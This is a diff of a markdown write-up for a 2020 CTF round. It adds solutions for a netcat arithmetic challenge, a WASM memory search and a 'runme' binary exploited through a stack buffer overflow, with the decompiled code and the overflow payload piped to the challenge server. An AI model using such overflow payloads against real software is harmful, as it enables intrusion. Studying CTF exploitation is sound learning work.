@@ -1,8 +1,8 @@
 # [√-1 + 1] CTF server problems 
 September 2020 Round
+33/33
 - Sanity Check
 - Robots
-- [NOT SOLVED] LONGGGGG CRYPTOOOOO (not available) (extra)
 - Linux Skillz
 - bof
 - LazyDB
@@ -10,7 +10,7 @@ September 2020 Round
 - MD5ed
 - Biblio
 - Hashed Potatoes
-- [NOT SOLVED] Quick Maths 
+- Quick Maths 
 - zhiepx
 - Infinity Library
 - Steg 1
@@ -32,6 +32,8 @@ September 2020 Round
 - MD5²
 - Braille
 - Whirlpool
+- Substitute Teacher
+- runme
 
 ## bof 
 > What's a buffer? Hmmmmmm... Is my buffer too small?
@@ -96,6 +98,42 @@ for j in range(33, 127):
 Flag: `flag{4}`
 
 
+## Quick Maths
+> My teacher sent me some massive homework!
+> Can you solve it for me?
+
+When connecting, we're given a string that looks something like 
+```
+72857789302222-95357471421734
+25254833624719+80134199293517
+```
+
+This goes on for 300 lines. To automate the netcat connection, we can use the pwntools python module. 
+
+```
+from pwn import *
+
+stillInp = True
+conn = remote('netcat.et3rnos.ga', 10000)
+
+while stillInp:
+	line = conn.readline()
+	print(line)
+	if (b'+' in line):
+		a = int(line.split(b'+')[0]) + int(line.split(b'+')[1])
+		print(a)
+		conn.sendline(str(a))
+	elif (b'-' in line):
+		a = int(line.split(b'-')[0]) - int(line.split(b'-')[1])
+		print(a)
+		conn.sendline(str(a))
+	else:
+		stillInp = False
+```
+
+Flag: `flag{w0w_qu1ck_m4th5}`
+
+
 ## Infinity Library
 > I lost my flag in an infinite library... Can you find it for me? I think I might have left it in wall 4, in shelf 5, in volume 11... 
 > Hint: I think I left the flag on page 353...
@@ -152,7 +190,7 @@ n = 5171500244749784337732001370840813567535978672198847710734293824916894058819
 e = 3
 c = 1668144786171137605311207197306944260478050012349906224126603002897455362394099285517422760838331356624110177579827875805257224612660500133080543787474026595048166638720426396963970753973937038866496085024710487212750758818995532990329189
 ```
-This is RSA! Credit to <https://blog.kuhi.to/picoctf_2019_crypto_writeup> becuase I still don't know how to do it.
+This is RSA! Credit to <https://blog.kuhi.to/picoctf_2019_crypto_writeup> for the process.
 
 ```
 ciphertext = plaintext ^ e mod n = plaintext ^ e, if plaintext ^ e < n
@@ -234,7 +272,9 @@ Flag: `flag{super_s3cret_fl4g_subm1t_th1s_f0r_a_s3cr3t_3xtr4_ch4ll3ng3}`
 > Hints: https://stackoverflow.com/questions/51562325/webassembly-correct-way-to-get-a-string-from-a-parameter-with-memory-address
 > https://marcoselvatici.github.io/WASM_tutorial/
 
-This is the jankiest and definitely not intended way to solve, especially given the first hint. The following code checks through all values in WASM memory, sees if they are not 0, checks if the decimal corresponds to a printable ASCII character, then prints it. This is input to the Javacript console.
+I don't think this was the intended way to solve, especially given the first hint, but it was easy to understand and execute. We're told to search through the memory, and the second hint references the `getValue` function, which can return values from memory.
+
+Since we don't know the specific address, we just check all of them. The following code checks through all values in WASM memory, sees if they are not 0, checks if the decimal corresponds to a printable ASCII character, then prints it.  This is then printed to the Javacript console. The printable ASCII character part is technically not necessary to solve this problem, but it does remove a lot of the garbage.
 
 ```
 var i;
@@ -250,3 +290,83 @@ Converting that decimal output to ASCII using RapidTables we get
 > msc'-&:6q/%r3.4tl6q3p%lq'l6t,<%sIlefÓheflagheresomewarebutIcan'trememberwhereIputit.Couldyousearchthroughmymemoryandfindit?-+0X0x(nuÒ)0123456789ABCDEF-0X+0X0X-0x+0x0xinfINFnanNAN.XgTsX!s!$!flag{w0nd3rou5-w0r1d-0f-wa5m}'-&:6q/%r3.4tl6q3p%lq'l6t,<./this.programP
 
 Flag: `flag{w0nd3rou5-w0r1d-0f-wa5m}`
+
+
+## runme
+> Run my program! Connect with nc imaginary.ml 10006.
+
+Unlike the previous binary exploitation challenge, we're only given the binary. Sad. Upon testing the program with a bunch of garbage, we find that this is another buffer overflow.
+
+I spent a very long time trying to go through GDB `disassemble main` and trying to find the offset. I'll leave my work in here but I didn't get very far. 
+```
+55 = segfault at __libc_start_main
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7e16c00 in __libc_start_main (main=0x7ffff7fb1680 <_IO_stdfile_0_lock>, 
+    argc=1431672497, argv=0x0, init=0x7ffff7fae980 <_IO_2_1_stdin_>, 
+    fini=0x7fffffffe050, rtld_fini=0x0, stack_end=0x7fffffffe168)
+    at ../csu/libc-start.c:141
+141     ../csu/libc-start.c: No such file or directory.
+```
+
+Here I was trying to figure out the offset was using a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) and GDB, but alas.
+
+```
+62 will rewrite all
+
+63 = segfault in main()
+0x00005555555551e2 in main () -- return function
+
+python -c "print('A'*58 + '\xcb\x51\x55\x55\x55\x55')"
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7AËQUUUU
+
++60 and +64 (cmp and jne) check if %rax is not equal to %rbp. If it's not, then make the jump (an if statement).
+```
+
+After this part, I knew that there was an if-statement at the end that checked if two values were equal to one another. If false, then it would skip the execution, which was the `<system@plt>`. However, I wasn't sure how this would evaluate in C. I tried to compare the binary to previous challenges, but no luck. I went to sleep.
+
+After a night, ainz gave me a hint to look into Ghidra. Woo! Alright, 30 minutes left. loading it up, I realize that Ghidra had the decompiler I was trying to find online. Here's the binary decompiled:
+```
+undefined8 main(void)
+
+{
+  char local_38 [40];
+  long local_10;
+  
+  local_10 = 0xba5eba11;
+  printf("What would you like to put in my variable? ");
+  gets(local_38);
+  if (local_10 == 0xacce55e5) {
+    system("cat flag.txt");
+  }
+  return 0;
+}
+
+```
+
+It's very clear now that we just need to overflow the buffer of local_38 in order to change the initialization of local_10. To do this, the offset was `40` and we add the hex value that `local_10` is being checked for. Anyway.
+
+testing:
+I had set up a flag.txt file that just read "opened flag.txt", which was used to confirm that the exploit worked. 
+```
+$ chmod +x runme
+$ python -c "print 'A'*40+'\xe5\x55\xce\xac'" > temp
+$ ./runme < temp
+opened flag.txt
+```
+
+
+exploit:
+```
+python -c "print 'A'*40+'\xe5\x55\xce\xac'" | nc imaginary.ml 10006
+```
+
+Flag: `flag{0v3rwr1t1ng_4_v4r1abl3?_c00l!}`
+
+Resources used for runme:
+- [0xRICK's intro to buffer overflows](https://0xrick.github.io/binary-exploitation/bof1/)
+- [Hacktober CTF Writeup](https://veteransec.com/2018/10/19/hacktober-ctf-2018-binary-analysis-larry/)
+- [StackOverflow on reading input](https://stackoverflow.com/questions/16508817/how-do-i-provide-input-to-a-c-program-from-bash)
+- [Online Disassembler](https://onlinedisassembler.com/odaweb/)
+- [Install Ghidra on Kali Linux](https://executeatwill.com/2019/04/04/Install-Ghidra-on-Kali-Linux/) ([+tutorial](https://www.youtube.com/watch?v=fTGTnrgjuGA))
+- [kgbuquerin's video on a similar exploit](https://www.youtube.com/watch?v=C-k516BHPl8)
+
